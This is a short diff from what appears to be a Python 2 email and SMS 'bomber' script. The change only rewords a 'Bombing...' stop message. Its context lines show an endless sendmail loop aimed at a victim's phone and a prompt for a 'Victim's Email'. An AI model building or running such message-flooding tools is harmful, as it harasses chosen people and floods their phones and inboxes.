@@ -62,7 +62,7 @@ if option == 1:
 
     while 1:
         obj.sendmail(username, v_phone, phone_message)
-        print "Bombing... Press Ctrl + Z To Stop"
+        print "Bombing... To Stop The Program CTRL + Z"
 
 if option == 2:
     v_email = raw_input("Victim's Email : ")
